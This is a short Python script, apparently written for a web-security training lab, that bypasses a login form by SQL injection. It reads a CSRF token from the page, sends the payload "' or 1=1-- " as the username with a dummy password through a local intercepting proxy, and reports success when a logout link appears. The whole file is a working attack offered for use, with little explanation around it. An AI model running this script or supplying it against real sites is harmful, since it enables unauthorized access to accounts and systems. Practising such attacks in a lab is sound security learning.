import sys
import requests
import urllib3
from bs4 import BeautifulSoup as bs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def csrft(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = bs(r.text, "html.parser")
    csrf = soup.find("input")['value']
    return csrf

def login(s, url):
    u = "' or 1=1-- "
    c = csrft(s, url)
    print(c)
    data = {"username":u, "password":"whatever", "csrf":c}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        url = sys.argv[1]
        s = requests.Session()
        if login(s, url):
            print("success")
        else:
            print("fail")
    except IndexError:
        print("Usage: %s <LoginURL>" % sys.argv[0])
